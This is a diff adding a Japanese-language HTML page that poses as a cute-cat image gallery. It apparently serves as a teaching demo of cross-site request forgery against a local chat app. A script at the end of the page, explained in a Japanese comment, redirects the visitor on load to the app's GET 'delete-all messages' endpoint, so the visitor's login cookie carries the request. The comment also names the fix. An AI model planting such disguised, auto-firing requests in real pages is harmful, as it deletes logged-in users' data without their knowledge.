@@ -1,0 +1,49 @@
+<!doctype html>
+<html lang="ja">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>かわいい猫の画像まとめ</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 8vh; color: #333; }
+    .cat { margin: 24px auto; }
+  </style>
+</head>
+<body>
+  <h1>かわいい猫の画像まとめ</h1>
+  <!-- 猫のイラスト（絵文字は使わない） -->
+  <svg class="cat" width="200" height="160" viewBox="0 0 200 160" xmlns="http://www.w3.org/2000/svg">
+    <ellipse cx="100" cy="120" rx="55" ry="38" fill="#c9ced3"/>
+    <circle cx="100" cy="70" r="46" fill="#c9ced3"/>
+    <path d="M62,44 L52,14 L84,36 Z" fill="#c9ced3"/>
+    <path d="M138,44 L148,14 L116,36 Z" fill="#c9ced3"/>
+    <circle cx="84" cy="66" r="6" fill="#3a3f45"/>
+    <circle cx="116" cy="66" r="6" fill="#3a3f45"/>
+    <path d="M94,80 Q100,86 106,80" fill="none" stroke="#3a3f45" stroke-width="3" stroke-linecap="round"/>
+    <line x1="60" y1="76" x2="30" y2="70" stroke="#9aa0a6" stroke-width="2"/>
+    <line x1="60" y1="82" x2="30" y2="84" stroke="#9aa0a6" stroke-width="2"/>
+    <line x1="140" y1="76" x2="170" y2="70" stroke="#9aa0a6" stroke-width="2"/>
+    <line x1="140" y1="82" x2="170" y2="84" stroke="#9aa0a6" stroke-width="2"/>
+  </svg>
+  <p>癒やされますね。</p>
+
+  <!--
+    ================== ここからが攻撃コード ==================
+    見た目は猫の画像ページ。でも読み込んだ瞬間、裏で
+    チャットアプリ(localhost:3000)の「全削除」URLへ勝手にアクセスする。
+
+    このページ(127.0.0.1:4000)とチャットアプリ(localhost:3000)は
+    ブラウザ的に「別サイト」。それでも、被害者がチャットにログイン中なら
+    ログインCookieが一緒に飛んでいくので、削除が成立してしまう。
+
+    ※ 削除エンドポイントが GET のうちは、この1行だけで攻撃が成立する。
+      課題3を直して POST + 出どころチェックにすると、これは効かなくなる。
+    =========================================================
+  -->
+  <script>
+    // 全メッセージ削除URLへ、タブごと移動させる（＝トップレベルのGETリクエスト）。
+    // これで被害者のログインCookieが送られてしまう。
+    location.href = 'http://localhost:3000/api/messages/delete-all';
+  </script>
+</body>
+</html>
